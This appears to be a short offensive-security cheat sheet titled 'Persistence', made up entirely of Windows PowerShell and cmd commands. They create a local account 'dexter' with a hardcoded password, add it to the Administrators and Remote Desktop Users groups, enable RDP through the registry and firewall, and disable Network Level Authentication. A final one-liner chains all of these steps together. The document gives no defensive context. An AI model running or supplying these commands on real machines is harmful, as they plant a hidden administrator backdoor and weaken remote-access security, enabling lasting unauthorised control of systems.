# Persistence

```powershell
net user /add dexter @Password123
net localgroup administrators dexter /add

Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\' -Name "fDenyTSConnections" -Value 0

Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

Start-Service -Name TermService

Set-Service -Name TermService -StartupType Automatic

# If your RDP client requires Network Level Authentication (NLA) but you want to disable it for ease of access, you can set this in the registry as well:
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\' -Name "UserAuthentication" -Value 0

# add user
Add-LocalGroupMember -Group "Remote Desktop Users" -Member dexter
net localgroup "Remote Desktop Users" dexter /add

# check
Get-LocalGroupMember -Group "Remote Desktop Users"
net localgroup "Remote Desktop Users"

# check service
Get-NetTCPConnection -LocalPort 5985

# one-liner
net user dexter @Password123 /add & net localgroup administrators dexter /add & net localgroup "Remote Desktop Users" dexter /add & reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f & reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f & netsh firewall add portopening TCP 3389 "Remote Desktop" & netsh firewall set service remoteadmin enable
```